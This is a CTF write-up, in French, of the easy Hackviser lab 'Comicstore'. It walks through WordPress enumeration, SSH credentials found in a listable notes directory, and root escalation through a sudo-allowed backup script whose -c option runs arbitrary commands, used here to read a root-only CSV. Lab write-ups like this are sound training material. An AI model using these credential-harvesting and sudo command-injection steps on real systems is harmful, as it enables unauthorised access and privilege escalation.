# Write-up CTF : Comicstore (Hackviser)

## Introduction

Le CTF **Comicstore** est une machine de niveau facile centrée sur l'énumération web, la découverte d'informations sensibles et une escalade de privilèges via un script mal configuré.

- **Nom d'hôte** : `comicstore.hv`
- **Utilisateur trouvé** : `johnny`
- **Mot de passe trouvé** : `bl4z3`

---

## 1. Énumération Initiale

### Scan Nuclei / Curl

Un scan initial a révélé un serveur Apache sous Debian hébergeant un WordPress. Plusieurs répertoires et fichiers intéressants ont été identifiés :

- `/README.html` & `/license.txt` (confirmant WordPress)
- `/_notes/` (répertoire listable)
- Port 22 (SSH) ouvert.

### Découvertes dans `/_notes/`

L'accès à `http://comicstore.hv/_notes/` a permis de récupérer plusieurs fichiers textes :

- **secret.txt** : Contient des notes mystérieuses.
- **securepasswords.txt** : A révélé les identifiants SSH.
  - `my ssh account: bl4z3`
  - L'utilisateur `Johnny` a été identifié via les posts du blog WordPress.

---

## 2. Accès Initial (SSH)

Grâce aux identifiants récupérés, nous nous sommes connectés via SSH :

```bash
ssh johnny@comicstore.hv
# Mot de passe : bl4z3
```

- La racine du site web se trouve à : `/srv/www/wordpress` (déterminé via la configuration Apache `DocumentRoot`).

---

## 3. Investigation et Post-Exploitation

### Répertoire des Comics

En explorant le dossier personnel de `johnny`, nous avons trouvé le répertoire où sont gardés les comics :

- **Chemin** : `/home/johnny/Documents/myc0ll3ct1on`
- **Contenu** : Plusieurs fichiers `.cba` et un fichier `scamlist.csv`.

### Script de Sauvegarde MP3

Une recherche de scripts sur le système a permis d'identifier le script utilisé pour la sauvegarde automatique des MP3 (mentionné dans l'énoncé) :

- **Chemin** : `/opt/.securebak/backup_mp3.sh`

---

## 4. Escalade de Privilèges

L'analyse des privilèges `sudo` de l'utilisateur `johnny` a révélé une configuration vulnérable :

```bash
johnny@comicstore:~$ sudo -l
(root) NOPASSWD: /opt/.securebak/backup_mp3.sh
```

Le contenu du script `backup_mp3.sh` montre qu'il accepte un argument `-c` qui est ensuite exécuté par le script (en tant que root) :

```bash
while getopts c: flag; do
  case "${flag}" in
    c) command=${OPTARG};;
  esac
done
# ...
cmd=$($command) && echo $cmd
```

---

## 5. Capture du Flag / Objectif Final

Le fichier `/home/johnny/Documents/myc0ll3ct1on/scamlist.csv` n'était lisible que par `root`. Nous avons exploité le script de backup pour le lire :

```bash
sudo /opt/.securebak/backup_mp3.sh -c "cat /home/johnny/Documents/myc0ll3ct1on/scamlist.csv"
```

**Résultat du fichier CSV :**

| Name | ComicIssue | Price | Notes |
| :--- | :--- | :--- | :--- |
| Garey Elwyn | #144 | 500 | A poor student... |
| Rudy Darryl | #64 | 350 | A total nerd... |
| **Emily Randolf** | #98 | 300 | **This woman is rolling in money** |
| Jones Nick | #32 | 500 | ... |
| Charleen Kayla | #11 | 300 | ... |

La personne la plus riche mentionnée dans le fichier est **Emily Randolf**.

---
**Fin du Write-up.**
